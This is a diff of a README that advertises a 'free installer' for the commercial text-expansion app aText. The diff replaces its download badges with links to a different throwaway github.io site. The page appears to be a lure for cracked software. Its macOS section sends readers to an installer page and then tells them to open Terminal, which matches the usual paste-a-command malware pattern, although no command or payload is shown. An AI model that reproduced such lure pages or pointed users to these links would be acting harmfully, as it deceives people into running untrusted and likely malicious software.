@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Text+Expander-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Text+Expansion-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 aText Free Installer** — aText is a text expander application for macOS and Windows that replaces abbreviations with full text snippets. Works without internet access, no account required. Full offline installation.
+**💻 aText Free Installer** — aText is a text expansion app for macOS and Windows that replaces abbreviations with frequently used phrases, email templates, and corrects typos instantly. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install aText](https://img.shields.io/badge/⬇_Install_aText-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install aText](https://img.shields.io/badge/⬇_Install_aText-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About aText
 
-aText is a text expander application for macOS and Windows that replaces abbreviations with full text snippets. Create shortcuts for frequently typed phrases, email templates, code blocks, and formatted text. With variable placeholders for dates, cursor positioning, and form inputs, aText automates repetitive text entry across all applications. Its one-time purchase model distinguishes it from subscription-based alternatives.
+aText is a text expansion app for macOS and Windows that replaces abbreviations with frequently used phrases, email templates, and corrects typos instantly. It saves hours of repetitive typing with a simple snippet library and system-wide trigger functionality.
 
 ---
 
 ## ❌ Problem: aText is hard to access
 
-- **Commercial License** — One-time purchase required
-- **Snippet Organization** — Large snippet libraries require good organization discipline
-- **Application Compatibility** — Some applications may not receive expanded text correctly
-- **Learning Shortcuts** — Maximum productivity requires memorizing abbreviation triggers
+- **Paid License** — Requires purchase; free trial limited in time
+- **macOS-Primary Feel** — Windows version less polished than the original macOS app
+- **Sync Limitations** — Cross-device snippet sync requires manual export/import
+- **Conflict Risk** — Text triggers can accidentally fire in non-intended contexts
 
 ---
 
@@ -61,9 +61,9 @@ aText is a text expander application for macOS and Windows that replaces abbrevi
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ aText is a text expander application for macOS and Windows that replaces abbrevi
 
 <div align="center">
 
-[![⬇ Install aText](https://img.shields.io/badge/⬇_Install_aText-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install aText](https://img.shields.io/badge/⬇_Install_aText-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ aText is a text expander application for macOS and Windows that replaces abbrevi
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ aText is a text expander application for macOS and Windows that replaces abbrevi
 
 ---
 
-**aText Free Installer** — aText is a text expander application for macOS and Windows that replaces abbreviations with full text snippets. Install without internet connection today!
+**aText Free Installer** — aText is a text expansion app for macOS and Windows that replaces abbreviations with frequently used phrases, email templates, and corrects typos instantly. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install aText](https://img.shields.io/badge/⬇_Install_aText-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install aText](https://img.shields.io/badge/⬇_Install_aText-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
